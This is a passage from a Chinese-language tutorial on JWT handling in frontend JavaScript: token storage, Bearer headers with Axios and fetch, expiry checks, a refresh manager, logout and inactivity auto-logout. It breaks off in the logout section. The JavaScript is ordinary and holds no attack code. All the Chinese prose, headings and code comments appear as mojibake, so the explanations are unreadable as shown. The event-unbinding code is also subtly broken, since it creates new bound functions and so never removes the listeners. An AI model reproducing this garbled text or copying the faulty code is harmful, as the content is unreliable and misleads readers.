---
title: 7ã€JWTå‰ç«¯é›†æˆå®è·µ
---
## ğŸ“š ç›®å½•

1. [å‰ç«¯Tokenå­˜å‚¨æ–¹å¼è¯¦è§£](#1-å‰ç«¯Tokenå­˜å‚¨æ–¹å¼è¯¦è§£)
2. [HTTPè¯·æ±‚ä¸­æºå¸¦Token](#2-HTTPè¯·æ±‚ä¸­æºå¸¦Token)
3. [Tokenè¿‡æœŸå¤„ç†ä¸åˆ·æ–°æœºåˆ¶](#3-Tokenè¿‡æœŸå¤„ç†ä¸åˆ·æ–°æœºåˆ¶)
4. [å‰ç«¯é€€å‡ºç™»å½•ä¸Tokenæ¸…é™¤](#4-å‰ç«¯é€€å‡ºç™»å½•ä¸Tokenæ¸…é™¤)
5. [APIè¯·æ±‚æ‹¦æˆªå™¨è®¾ç½®](#5-APIè¯·æ±‚æ‹¦æˆªå™¨è®¾ç½®)
6. [Tokenå­˜å‚¨å®‰å…¨æ€§å¯¹æ¯”](#6-Tokenå­˜å‚¨å®‰å…¨æ€§å¯¹æ¯”)
7. [XSSå’ŒCSRFé˜²æŠ¤](#7-XSSå’ŒCSRFé˜²æŠ¤)
8. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#8-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸª å‰ç«¯Tokenå­˜å‚¨æ–¹å¼è¯¦è§£


### 1.1 ä¸‰ç§ä¸»è¦å­˜å‚¨æ–¹å¼


å½“ç”¨æˆ·ç™»å½•æˆåŠŸåï¼Œå‰ç«¯éœ€è¦ä¿å­˜æœåŠ¡å™¨è¿”å›çš„JWT Tokenï¼Œå°±åƒæŠŠé’¥åŒ™æ”¾åœ¨å®¶é‡Œçš„æŸä¸ªåœ°æ–¹ä¸€æ ·ã€‚æµè§ˆå™¨æä¾›äº†ä¸‰ä¸ªä¸»è¦çš„"å­˜å‚¨æŸœ"ï¼š

```
æµè§ˆå™¨å­˜å‚¨å¯¹æ¯”ï¼š

ğŸ—„ï¸ LocalStorage     ğŸ—‚ï¸ SessionStorage     ğŸª Cookie
   |                    |                     |
æ°¸ä¹…å­˜å‚¨              ä¼šè¯å­˜å‚¨              å¯è®¾ç½®è¿‡æœŸ
å…³é—­æµè§ˆå™¨ä¸ä¸¢å¤±      å…³é—­æ ‡ç­¾é¡µå°±ä¸¢å¤±       å¯è·¨æ ‡ç­¾é¡µ
ä¸ä¼šè‡ªåŠ¨å‘é€          ä¸ä¼šè‡ªåŠ¨å‘é€          è‡ªåŠ¨å‘é€ç»™æœåŠ¡å™¨
```

### 1.2 LocalStorageå­˜å‚¨æ–¹å¼


**ğŸ”¸ ä»€ä¹ˆæ˜¯LocalStorageï¼Ÿ**
LocalStorageå°±åƒä½ å®¶é‡Œçš„ä¿é™©æŸœï¼Œæ”¾è¿›å»çš„ä¸œè¥¿ä¼šä¸€ç›´ä¿å­˜ï¼Œé™¤éä½ ä¸»åŠ¨åˆ é™¤æˆ–æ¸…ç©ºæµè§ˆå™¨æ•°æ®ã€‚

```javascript
// ğŸ”‘ å­˜å‚¨Token
const saveToken = (token) => {
    localStorage.setItem('authToken', token);
    console.log('Tokenå·²ä¿å­˜åˆ°LocalStorage');
};

// ğŸ” è·å–Token
const getToken = () => {
    const token = localStorage.getItem('authToken');
    if (token) {
        console.log('æ‰¾åˆ°Token:', token.substring(0, 20) + '...');
        return token;
    }
    console.log('æ²¡æœ‰æ‰¾åˆ°Token');
    return null;
};

// ğŸ—‘ï¸ åˆ é™¤Token
const removeToken = () => {
    localStorage.removeItem('authToken');
    console.log('Tokenå·²ä»LocalStorageåˆ é™¤');
};
```

**âœ… LocalStorageçš„ä¼˜ç‚¹ï¼š**
- æ°¸ä¹…ä¿å­˜ï¼Œç”¨æˆ·ä¸‹æ¬¡æ‰“å¼€ç½‘ç«™è¿˜èƒ½ä¿æŒç™»å½•çŠ¶æ€
- å­˜å‚¨ç©ºé—´å¤§ï¼ˆé€šå¸¸5-10MBï¼‰
- æ“ä½œç®€å•ï¼Œè¯»å†™é€Ÿåº¦å¿«

**âŒ LocalStorageçš„ç¼ºç‚¹ï¼š**
- å®¹æ˜“è¢«XSSæ”»å‡»è·å–ï¼ˆJavaScriptå¯ä»¥éšæ„è¯»å–ï¼‰
- åœ¨ä¸åŒæ ‡ç­¾é¡µé—´å…±äº«ï¼Œå¯èƒ½æœ‰å®‰å…¨é£é™©

### 1.3 SessionStorageå­˜å‚¨æ–¹å¼


**ğŸ”¸ ä»€ä¹ˆæ˜¯SessionStorageï¼Ÿ**
SessionStorageåƒä½ æ¡Œå­ä¸Šçš„ä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œåªåœ¨å½“å‰å·¥ä½œæœŸé—´æœ‰æ•ˆï¼Œå…³é—­æµè§ˆå™¨æ ‡ç­¾é¡µå°±æ¶ˆå¤±äº†ã€‚

```javascript
// ä¼šè¯çº§åˆ«çš„Tokenç®¡ç†
const sessionTokenManager = {
    // ä¿å­˜Token
    save: (token) => {
        sessionStorage.setItem('sessionToken', token);
        console.log('Tokenä¿å­˜åˆ°å½“å‰ä¼šè¯');
    },
    
    // è·å–Token
    get: () => {
        return sessionStorage.getItem('sessionToken');
    },
    
    // æ¸…é™¤Token
    clear: () => {
        sessionStorage.removeItem('sessionToken');
        console.log('ä¼šè¯Tokenå·²æ¸…é™¤');
    }
};

// ä½¿ç”¨ç¤ºä¾‹
sessionTokenManager.save('eyJhbGciOiJIUzI1NiIs...');
const token = sessionTokenManager.get();
```

**âœ… SessionStorageçš„ä¼˜ç‚¹ï¼š**
- å…³é—­æ ‡ç­¾é¡µè‡ªåŠ¨æ¸…é™¤ï¼Œå®‰å…¨æ€§è¾ƒé«˜
- ä¸åŒæ ‡ç­¾é¡µéš”ç¦»ï¼Œé¿å…Tokenæ··ä¹±
- é€‚åˆæ•æ„Ÿæ“ä½œçš„ä¸´æ—¶è®¤è¯

**âŒ SessionStorageçš„ç¼ºç‚¹ï¼š**
- ç”¨æˆ·ä½“éªŒä¸ä½³ï¼ˆå…³é—­æ ‡ç­¾é¡µå°±è¦é‡æ–°ç™»å½•ï¼‰
- ä»ç„¶å¯èƒ½è¢«åŒé¡µé¢çš„XSSæ”»å‡»è·å–

### 1.4 Cookieå­˜å‚¨æ–¹å¼


**ğŸ”¸ ä»€ä¹ˆæ˜¯Cookieï¼Ÿ**
Cookieåƒå¿«é€’å‘˜æ‰‹é‡Œçš„é€šè¡Œè¯ï¼Œæ¯æ¬¡å»æŸä¸ªåœ°æ–¹ï¼ˆè®¿é—®ç½‘ç«™ï¼‰éƒ½ä¼šè‡ªåŠ¨å‡ºç¤ºç»™é—¨å«ï¼ˆæœåŠ¡å™¨ï¼‰ã€‚

```javascript
// Cookieæ“ä½œå·¥å…·ç±»
const cookieManager = {
    // è®¾ç½®Cookie
    set: (name, value, days = 7) => {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        const expires = "expires=" + date.toUTCString();
        
        // HttpOnlyå’ŒSecureæ ‡å¿—åªèƒ½åœ¨æœåŠ¡å™¨ç«¯è®¾ç½®
        document.cookie = `${name}=${value};${expires};path=/;SameSite=Strict`;
        console.log(`Cookie ${name} å·²è®¾ç½®ï¼Œæœ‰æ•ˆæœŸ${days}å¤©`);
    },
    
    // è·å–Cookie
    get: (name) => {
        const nameEQ = name + "=";
        const cookies = document.cookie.split(';');
        
        for (let cookie of cookies) {
            cookie = cookie.trim();
            if (cookie.indexOf(nameEQ) === 0) {
                return cookie.substring(nameEQ.length);
            }
        }
        return null;
    },
    
    // åˆ é™¤Cookie
    delete: (name) => {
        document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;`;
        console.log(`Cookie ${name} å·²åˆ é™¤`);
    }
};

// ä½¿ç”¨ç¤ºä¾‹
cookieManager.set('authToken', 'eyJhbGciOiJIUzI1NiIs...', 30); // 30å¤©æœ‰æ•ˆ
const token = cookieManager.get('authToken');
```

---

## 2. ğŸ“¡ HTTPè¯·æ±‚ä¸­æºå¸¦Token


### 2.1 Tokenä¼ è¾“çš„åŸºæœ¬åŸç†


å½“æˆ‘ä»¬éœ€è¦è®¿é—®éœ€è¦èº«ä»½éªŒè¯çš„æ¥å£æ—¶ï¼Œå°±åƒè¿›å…¥éœ€è¦é—¨ç¦å¡çš„åŠå…¬æ¥¼ï¼Œå¿…é¡»å‡ºç¤ºæˆ‘ä»¬çš„"é€šè¡Œè¯"ï¼ˆTokenï¼‰ã€‚

```
Tokenä¼ è¾“æµç¨‹ï¼š

å®¢æˆ·ç«¯                                   æœåŠ¡å™¨
   |                                      |
   |--[1] ç™»å½•è¯·æ±‚(ç”¨æˆ·å+å¯†ç )----------->|
   |<-[2] è¿”å›JWT Token------------------|
   |                                      |
   |--[3] APIè¯·æ±‚ + Authorizationå¤´------>|
   |     Bearer eyJhbGciOiJIUzI1NiIs...   |
   |<-[4] è¿”å›å—ä¿æŠ¤çš„æ•°æ®----------------|
```

### 2.2 ä½¿ç”¨Axiosæºå¸¦Token


**ğŸ”¸ ä»€ä¹ˆæ˜¯Axiosï¼Ÿ**
Axiosæ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥å‘é€HTTPè¯·æ±‚çš„JavaScriptåº“ï¼Œå°±åƒä¸€ä¸ªä¸“ä¸šçš„å¿«é€’å‘˜ï¼Œå¯ä»¥å¸®ä½ æŠŠè¯·æ±‚å‡†ç¡®é€è¾¾æœåŠ¡å™¨ã€‚

```javascript
// åŸºç¡€çš„Axios Tokenä½¿ç”¨
import axios from 'axios';

// æ–¹å¼1ï¼šåœ¨æ¯ä¸ªè¯·æ±‚ä¸­æ‰‹åŠ¨æ·»åŠ Token
const getUserInfo = async () => {
    const token = localStorage.getItem('authToken');
    
    try {
        const response = await axios.get('/api/user/info', {
            headers: {
                'Authorization': `Bearer ${token}`  // Beareræ˜¯Tokenç±»å‹çš„æ ‡è¯†
            }
        });
        
        console.log('ç”¨æˆ·ä¿¡æ¯:', response.data);
        return response.data;
    } catch (error) {
        console.error('è·å–ç”¨æˆ·ä¿¡æ¯å¤±è´¥:', error.message);
        throw error;
    }
};

// æ–¹å¼2ï¼šè®¾ç½®é»˜è®¤è¯·æ±‚å¤´ï¼ˆæ¨èæ–¹å¼ï¼‰
const setupAxiosDefaults = () => {
    const token = localStorage.getItem('authToken');
    
    if (token) {
        // è®¾ç½®é»˜è®¤çš„Authorizationå¤´
        axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;
        console.log('å·²è®¾ç½®é»˜è®¤Authorizationå¤´');
    }
};

// åˆå§‹åŒ–æ—¶è°ƒç”¨
setupAxiosDefaults();

// ç°åœ¨æ‰€æœ‰axiosè¯·æ±‚éƒ½ä¼šè‡ªåŠ¨æºå¸¦Token
const fetchUserData = async () => {
    const response = await axios.get('/api/user/profile');
    return response.data;
};
```

### 2.3 ä½¿ç”¨Fetchæºå¸¦Token


**ğŸ”¸ ä»€ä¹ˆæ˜¯Fetchï¼Ÿ**
Fetchæ˜¯æµè§ˆå™¨å†…ç½®çš„è¯·æ±‚æ–¹æ³•ï¼Œå°±åƒæµè§ˆå™¨è‡ªå¸¦çš„é‚®é€’å‘˜ï¼Œä¸éœ€è¦é¢å¤–å®‰è£…å°±èƒ½ä½¿ç”¨ã€‚

```javascript
// Fetch APIä¸­æºå¸¦Token
const fetchWithToken = async (url, options = {}) => {
    const token = localStorage.getItem('authToken');
    
    // é»˜è®¤é…ç½®
    const config = {
        headers: {
            'Content-Type': 'application/json',
            ...options.headers
        },
        ...options
    };
    
    // æ·»åŠ Authorizationå¤´
    if (token) {
        config.headers['Authorization'] = `Bearer ${token}`;
    }
    
    try {
        const response = await fetch(url, config);
        
        // æ£€æŸ¥å“åº”çŠ¶æ€
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        return await response.json();
    } catch (error) {
        console.error('è¯·æ±‚å¤±è´¥:', error);
        throw error;
    }
};

// ä½¿ç”¨ç¤ºä¾‹
const getUserProfile = async () => {
    try {
        const userData = await fetchWithToken('/api/user/profile');
        console.log('ç”¨æˆ·èµ„æ–™:', userData);
        return userData;
    } catch (error) {
        console.error('è·å–ç”¨æˆ·èµ„æ–™å¤±è´¥:', error);
    }
};

// POSTè¯·æ±‚ç¤ºä¾‹
const updateUserInfo = async (userInfo) => {
    return await fetchWithToken('/api/user/update', {
        method: 'POST',
        body: JSON.stringify(userInfo)
    });
};
```

---

## 3. â° Tokenè¿‡æœŸå¤„ç†ä¸åˆ·æ–°æœºåˆ¶


### 3.1 Tokenè¿‡æœŸçš„ç°è±¡å’ŒåŸç†


**ğŸ”¸ ä¸ºä»€ä¹ˆTokenä¼šè¿‡æœŸï¼Ÿ**
Tokenè¿‡æœŸå°±åƒèº«ä»½è¯æœ‰æœ‰æ•ˆæœŸä¸€æ ·ï¼Œè¿™æ˜¯ä¸ºäº†å®‰å…¨è€ƒè™‘ã€‚å¦‚æœTokenæ°¸ä¸è¿‡æœŸï¼Œä¸€æ—¦æ³„éœ²å°±ä¼šä¸€ç›´æœ‰æ•ˆï¼Œé£é™©å¾ˆå¤§ã€‚

```
Tokenè¿‡æœŸæ£€æµ‹æµç¨‹ï¼š

ç”¨æˆ·è¯·æ±‚API
    |
æ£€æŸ¥Tokenæ˜¯å¦å­˜åœ¨
    |
å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨
    |
æœåŠ¡å™¨éªŒè¯Token
    |
    â”œâ”€â”€ Tokenæœ‰æ•ˆ âœ è¿”å›æ•°æ®
    |
    â””â”€â”€ Tokenè¿‡æœŸ âœ è¿”å›401é”™è¯¯
            |
        å‰ç«¯å¤„ç†è¿‡æœŸ
```

### 3.2 æ£€æµ‹Tokenè¿‡æœŸ


```javascript
// Tokenè¿‡æœŸæ£€æµ‹å·¥å…·
const tokenUtils = {
    // æ£€æŸ¥Tokenæ˜¯å¦è¿‡æœŸ
    isTokenExpired: (token) => {
        if (!token) return true;
        
        try {
            // JWT Tokenç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œä¸­é—´æ˜¯payload
            const payload = JSON.parse(atob(token.split('.')[1]));
            const currentTime = Date.now() / 1000; // è½¬æ¢ä¸ºç§’
            
            // expæ˜¯è¿‡æœŸæ—¶é—´æˆ³
            if (payload.exp && payload.exp < currentTime) {
                console.log('Tokenå·²è¿‡æœŸ');
                return true;
            }
            
            console.log('Tokenä»ç„¶æœ‰æ•ˆ');
            return false;
        } catch (error) {
            console.error('Tokenæ ¼å¼é”™è¯¯:', error);
            return true;
        }
    },
    
    // è·å–Tokenå‰©ä½™æœ‰æ•ˆæ—¶é—´
    getRemainingTime: (token) => {
        if (!token) return 0;
        
        try {
            const payload = JSON.parse(atob(token.split('.')[1]));
            const currentTime = Date.now() / 1000;
            
            if (payload.exp) {
                const remaining = payload.exp - currentTime;
                return Math.max(0, remaining); // è¿”å›ç§’æ•°
            }
        } catch (error) {
            console.error('è§£æTokenå¤±è´¥:', error);
        }
        
        return 0;
    }
};

// ä½¿ç”¨ç¤ºä¾‹
const checkTokenStatus = () => {
    const token = localStorage.getItem('authToken');
    
    if (tokenUtils.isTokenExpired(token)) {
        console.log('éœ€è¦é‡æ–°ç™»å½•æˆ–åˆ·æ–°Token');
        // å¤„ç†è¿‡æœŸé€»è¾‘
        handleTokenExpired();
    } else {
        const remainingTime = tokenUtils.getRemainingTime(token);
        console.log(`Tokenè¿˜æœ‰${Math.floor(remainingTime / 60)}åˆ†é’Ÿæœ‰æ•ˆ`);
    }
};
```

### 3.3 Tokenè‡ªåŠ¨åˆ·æ–°æœºåˆ¶


**ğŸ”¸ ä»€ä¹ˆæ˜¯Tokenåˆ·æ–°ï¼Ÿ**
Tokenåˆ·æ–°å°±åƒç»­ç­¾ç­¾è¯ï¼Œåœ¨æ—§è¯ä»¶è¿‡æœŸå‰ç”¨å®ƒæ¢å–æ–°çš„æœ‰æ•ˆè¯ä»¶ï¼Œè¿™æ ·ç”¨æˆ·å°±ä¸éœ€è¦é‡æ–°ç™»å½•äº†ã€‚

```javascript
// Tokenåˆ·æ–°ç®¡ç†å™¨
class TokenRefreshManager {
    constructor() {
        this.isRefreshing = false;        // æ˜¯å¦æ­£åœ¨åˆ·æ–°
        this.refreshPromise = null;       // åˆ·æ–°Promiseï¼Œé¿å…é‡å¤åˆ·æ–°
        this.failedQueue = [];           // å¤±è´¥è¯·æ±‚é˜Ÿåˆ—
    }
    
    // åˆ·æ–°Token
    async refreshToken() {
        // å¦‚æœå·²ç»åœ¨åˆ·æ–°ï¼Œè¿”å›ç°æœ‰Promise
        if (this.isRefreshing) {
            return this.refreshPromise;
        }
        
        this.isRefreshing = true;
        console.log('å¼€å§‹åˆ·æ–°Token...');
        
        this.refreshPromise = this.doRefresh();
        
        try {
            const result = await this.refreshPromise;
            this.isRefreshing = false;
            this.refreshPromise = null;
            return result;
        } catch (error) {
            this.isRefreshing = false;
            this.refreshPromise = null;
            throw error;
        }
    }
    
    // æ‰§è¡Œåˆ·æ–°æ“ä½œ
    async doRefresh() {
        const refreshToken = localStorage.getItem('refreshToken');
        
        if (!refreshToken) {
            throw new Error('æ²¡æœ‰åˆ·æ–°Tokenï¼Œéœ€è¦é‡æ–°ç™»å½•');
        }
        
        try {
            const response = await fetch('/api/auth/refresh', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ refreshToken })
            });
            
            if (!response.ok) {
                throw new Error('åˆ·æ–°Tokenå¤±è´¥');
            }
            
            const data = await response.json();
            
            // ä¿å­˜æ–°Token
            localStorage.setItem('authToken', data.accessToken);
            if (data.refreshToken) {
                localStorage.setItem('refreshToken', data.refreshToken);
            }
            
            console.log('Tokenåˆ·æ–°æˆåŠŸ');
            return data.accessToken;
            
        } catch (error) {
            console.error('Tokenåˆ·æ–°å¤±è´¥:', error);
            // åˆ·æ–°å¤±è´¥ï¼Œæ¸…é™¤æ‰€æœ‰Token
            localStorage.removeItem('authToken');
            localStorage.removeItem('refreshToken');
            throw error;
        }
    }
}

// åˆ›å»ºå…¨å±€å®ä¾‹
const refreshManager = new TokenRefreshManager();
```

### 3.4 è‡ªåŠ¨åˆ·æ–°é›†æˆ


```javascript
// å°†åˆ·æ–°æœºåˆ¶é›†æˆåˆ°è¯·æ±‚ä¸­
const apiClient = {
    async request(url, options = {}) {
        let token = localStorage.getItem('authToken');
        
        // æ£€æŸ¥Tokenæ˜¯å¦å³å°†è¿‡æœŸï¼ˆæå‰5åˆ†é’Ÿåˆ·æ–°ï¼‰
        if (token && this.shouldRefreshToken(token)) {
            console.log('Tokenå³å°†è¿‡æœŸï¼Œä¸»åŠ¨åˆ·æ–°...');
            try {
                token = await refreshManager.refreshToken();
            } catch (error) {
                console.error('ä¸»åŠ¨åˆ·æ–°å¤±è´¥:', error);
                this.redirectToLogin();
                return;
            }
        }
        
        // å‘é€è¯·æ±‚
        const config = {
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json',
                ...options.headers
            },
            ...options
        };
        
        try {
            const response = await fetch(url, config);
            
            // å¦‚æœè¿”å›401ï¼Œå°è¯•åˆ·æ–°Token
            if (response.status === 401) {
                console.log('æ”¶åˆ°401å“åº”ï¼Œå°è¯•åˆ·æ–°Token');
                
                try {
                    const newToken = await refreshManager.refreshToken();
                    
                    // ç”¨æ–°Tokené‡è¯•è¯·æ±‚
                    config.headers['Authorization'] = `Bearer ${newToken}`;
                    const retryResponse = await fetch(url, config);
                    
                    if (retryResponse.ok) {
                        console.log('ä½¿ç”¨æ–°Tokené‡è¯•æˆåŠŸ');
                        return await retryResponse.json();
                    }
                } catch (refreshError) {
                    console.error('åˆ·æ–°Tokenå¤±è´¥ï¼Œè·³è½¬ç™»å½•');
                    this.redirectToLogin();
                    return;
                }
            }
            
            if (response.ok) {
                return await response.json();
            } else {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
        } catch (error) {
            console.error('è¯·æ±‚å¤±è´¥:', error);
            throw error;
        }
    },
    
    // æ£€æŸ¥æ˜¯å¦éœ€è¦åˆ·æ–°Token
    shouldRefreshToken(token) {
        const remainingTime = tokenUtils.getRemainingTime(token);
        return remainingTime > 0 && remainingTime < 300; // 5åˆ†é’Ÿå†…è¿‡æœŸ
    },
    
    // è·³è½¬åˆ°ç™»å½•é¡µé¢
    redirectToLogin() {
        localStorage.clear();
        window.location.href = '/login';
    }
};

// ä½¿ç”¨ç¤ºä¾‹
const fetchUserData = async () => {
    try {
        const userData = await apiClient.request('/api/user/info');
        console.log('ç”¨æˆ·æ•°æ®:', userData);
        return userData;
    } catch (error) {
        console.error('è·å–ç”¨æˆ·æ•°æ®å¤±è´¥:', error);
    }
};
```

---

## 4. ğŸšª å‰ç«¯é€€å‡ºç™»å½•ä¸Tokenæ¸…é™¤


### 4.1 é€€å‡ºç™»å½•çš„å®Œæ•´æµç¨‹


é€€å‡ºç™»å½•ä¸ä»…ä»…æ˜¯è·³è½¬åˆ°ç™»å½•é¡µé¢ï¼Œè¿˜éœ€è¦å½»åº•æ¸…ç†ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ï¼Œå°±åƒæ¬å®¶æ—¶è¦æŠŠæ‰€æœ‰ä¸ªäººç‰©å“éƒ½æ¬èµ°ä¸€æ ·ã€‚

```
é€€å‡ºç™»å½•æµç¨‹ï¼š

ç”¨æˆ·ç‚¹å‡»é€€å‡º
    |
æ¸…é™¤æœ¬åœ°Token
    |
é€šçŸ¥æœåŠ¡å™¨Tokenå¤±æ•ˆ
    |
æ¸…é™¤ç”¨æˆ·çŠ¶æ€
    |
è·³è½¬åˆ°ç™»å½•é¡µé¢
```

### 4.2 å®Œæ•´çš„é€€å‡ºç™»å½•å®ç°


```javascript
// é€€å‡ºç™»å½•ç®¡ç†å™¨
class LogoutManager {
    constructor() {
        this.isLoggingOut = false;
    }
    
    // æ‰§è¡Œé€€å‡ºç™»å½•
    async logout() {
        if (this.isLoggingOut) {
            console.log('æ­£åœ¨é€€å‡ºç™»å½•ï¼Œè¯·ç¨å€™...');
            return;
        }
        
        this.isLoggingOut = true;
        console.log('å¼€å§‹é€€å‡ºç™»å½•æµç¨‹...');
        
        try {
            // æ­¥éª¤1ï¼šé€šçŸ¥æœåŠ¡å™¨
            await this.notifyServerLogout();
            
            // æ­¥éª¤2ï¼šæ¸…é™¤æœ¬åœ°å­˜å‚¨
            this.clearLocalStorage();
            
            // æ­¥éª¤3ï¼šé‡ç½®åº”ç”¨çŠ¶æ€
            this.resetAppState();
            
            // æ­¥éª¤4ï¼šè·³è½¬åˆ°ç™»å½•é¡µ
            this.redirectToLogin();
            
            console.log('é€€å‡ºç™»å½•å®Œæˆ');
            
        } catch (error) {
            console.error('é€€å‡ºç™»å½•è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯:', error);
            // å³ä½¿æœåŠ¡å™¨é€šçŸ¥å¤±è´¥ï¼Œä¹Ÿè¦æ¸…é™¤æœ¬åœ°æ•°æ®
            this.clearLocalStorage();
            this.redirectToLogin();
        } finally {
            this.isLoggingOut = false;
        }
    }
    
    // é€šçŸ¥æœåŠ¡å™¨Tokenå¤±æ•ˆ
    async notifyServerLogout() {
        const token = localStorage.getItem('authToken');
        
        if (!token) {
            console.log('æ²¡æœ‰Tokenï¼Œè·³è¿‡æœåŠ¡å™¨é€šçŸ¥');
            return;
        }
        
        try {
            await fetch('/api/auth/logout', {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${token}`,
                    'Content-Type': 'application/json'
                }
            });
            
            console.log('å·²é€šçŸ¥æœåŠ¡å™¨Tokenå¤±æ•ˆ');
        } catch (error) {
            console.warn('é€šçŸ¥æœåŠ¡å™¨å¤±è´¥ï¼Œä½†ç»§ç»­é€€å‡ºæµç¨‹:', error);
        }
    }
    
    // æ¸…é™¤æœ¬åœ°å­˜å‚¨
    clearLocalStorage() {
        console.log('æ¸…é™¤æœ¬åœ°å­˜å‚¨...');
        
        // æ¸…é™¤Tokenç›¸å…³
        localStorage.removeItem('authToken');
        localStorage.removeItem('refreshToken');
        
        // æ¸…é™¤ç”¨æˆ·ä¿¡æ¯
        localStorage.removeItem('userInfo');
        localStorage.removeItem('userPreferences');
        
        // æ¸…é™¤SessionStorage
        sessionStorage.clear();
        
        // æ¸…é™¤Cookieä¸­çš„Tokenï¼ˆå¦‚æœä½¿ç”¨Cookieå­˜å‚¨ï¼‰
        this.clearAuthCookies();
        
        console.log('æœ¬åœ°å­˜å‚¨å·²æ¸…é™¤');
    }
    
    // æ¸…é™¤è®¤è¯ç›¸å…³Cookie
    clearAuthCookies() {
        const cookiesToClear = ['authToken', 'refreshToken', 'sessionId'];
        
        cookiesToClear.forEach(cookieName => {
            document.cookie = `${cookieName}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;`;
            document.cookie = `${cookieName}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;domain=${location.hostname};`;
        });
        
        console.log('è®¤è¯Cookieå·²æ¸…é™¤');
    }
    
    // é‡ç½®åº”ç”¨çŠ¶æ€
    resetAppState() {
        console.log('é‡ç½®åº”ç”¨çŠ¶æ€...');
        
        // å¦‚æœä½¿ç”¨çŠ¶æ€ç®¡ç†åº“ï¼ˆå¦‚Vuexã€Reduxï¼‰ï¼Œåœ¨è¿™é‡Œé‡ç½®çŠ¶æ€
        // ä¾‹å¦‚ï¼šstore.dispatch('auth/reset');
        
        // æ¸…é™¤Axiosé»˜è®¤å¤´
        if (window.axios && window.axios.defaults) {
            delete window.axios.defaults.headers.common['Authorization'];
        }
        
        // è§¦å‘è‡ªå®šä¹‰äº‹ä»¶ï¼Œé€šçŸ¥å…¶ä»–ç»„ä»¶ç”¨æˆ·å·²é€€å‡º
        window.dispatchEvent(new CustomEvent('userLoggedOut'));
    }
    
    // è·³è½¬åˆ°ç™»å½•é¡µé¢
    redirectToLogin() {
        console.log('è·³è½¬åˆ°ç™»å½•é¡µé¢');
        
        // ä¿å­˜å½“å‰é¡µé¢URLï¼Œç™»å½•åå¯ä»¥è·³å›æ¥
        const currentPath = window.location.pathname;
        if (currentPath !== '/login') {
            localStorage.setItem('redirectAfterLogin', currentPath);
        }
        
        // è·³è½¬åˆ°ç™»å½•é¡µ
        window.location.href = '/login';
    }
    
    // å¿«é€Ÿé€€å‡ºï¼ˆç´§æ€¥æƒ…å†µä½¿ç”¨ï¼‰
    emergencyLogout() {
        console.log('æ‰§è¡Œç´§æ€¥é€€å‡º...');
        localStorage.clear();
        sessionStorage.clear();
        window.location.href = '/login';
    }
}

// åˆ›å»ºå…¨å±€å®ä¾‹
const logoutManager = new LogoutManager();

// é€€å‡ºç™»å½•æŒ‰é’®äº‹ä»¶å¤„ç†
const handleLogoutClick = async () => {
    const confirmed = confirm('ç¡®å®šè¦é€€å‡ºç™»å½•å—ï¼Ÿ');
    if (confirmed) {
        await logoutManager.logout();
    }
};
```

### 4.3 è‡ªåŠ¨é€€å‡ºæœºåˆ¶


```javascript
// è‡ªåŠ¨é€€å‡ºè§¦å‘å™¨
class AutoLogoutTrigger {
    constructor() {
        this.checkInterval = null;
        this.lastActivity = Date.now();
        this.inactivityTimeout = 30 * 60 * 1000; // 30åˆ†é’Ÿæ— æ´»åŠ¨è‡ªåŠ¨é€€å‡º
    }
    
    // å¼€å§‹ç›‘æ§
    startMonitoring() {
        console.log('å¼€å§‹ç›‘æ§ç”¨æˆ·æ´»åŠ¨...');
        
        // ç›‘å¬ç”¨æˆ·æ´»åŠ¨
        this.bindActivityEvents();
        
        // å®šæœŸæ£€æŸ¥Tokenå’Œæ´»åŠ¨çŠ¶æ€
        this.checkInterval = setInterval(() => {
            this.checkTokenAndActivity();
        }, 60000); // æ¯åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡
    }
    
    // åœæ­¢ç›‘æ§
    stopMonitoring() {
        if (this.checkInterval) {
            clearInterval(this.checkInterval);
            this.checkInterval = null;
        }
        this.unbindActivityEvents();
        console.log('åœæ­¢ç›‘æ§ç”¨æˆ·æ´»åŠ¨');
    }
    
    // ç»‘å®šæ´»åŠ¨äº‹ä»¶
    bindActivityEvents() {
        const events = ['click', 'scroll', 'keypress', 'mousemove'];
        
        events.forEach(event => {
            document.addEventListener(event, this.updateActivity.bind(this));
        });
    }
    
    // è§£ç»‘æ´»åŠ¨äº‹ä»¶
    unbindActivityEvents() {
        const events = ['click', 'scroll', 'keypress', 'mousemove'];
        
        events.forEach(event => {
            document.removeEventListener(event, this.updateActivity.bind(this));
        });
    }
    
    // æ›´æ–°æ´»åŠ¨æ—¶é—´
    updateActivity() {
        this.lastActivity = Date.now();
    }
    
    // æ£€æŸ¥Tokenå’Œæ´»åŠ¨çŠ¶æ€
    checkTokenAndActivity() {
        const token = localStorage.getItem('authToken');
        
        // æ£€æŸ¥Tokenæ˜¯å¦å­˜åœ¨å’Œæœ‰æ•ˆ
        if (!token || tokenUtils.isTokenExpired(token)) {
            console.log('Tokenæ— æ•ˆæˆ–è¿‡æœŸï¼Œè‡ªåŠ¨é€€å‡º');
            logoutManager.logout();
            return;
        }
        
        // æ£€æŸ¥ç”¨æˆ·æ´»åŠ¨
        const inactiveTime = Date.now() - this.lastActivity;
        if (inactiveTime > this.inactivityTimeout) {
            console.log('ç”¨æˆ·é•¿æ—¶é—´æ— æ´»åŠ¨ï¼Œè‡ªåŠ¨é€€å‡º');
            alert('ç”±äºé•¿æ—¶é—´æ— æ´»åŠ¨ï¼Œç³»ç»Ÿå°†è‡ªåŠ¨é€€å‡ºç™»å½•');
            logoutManager.logout();
        }
    }
}

// åˆ›å»ºå¹¶å¯åŠ¨è‡ªåŠ¨é€€å‡ºç›‘æ§
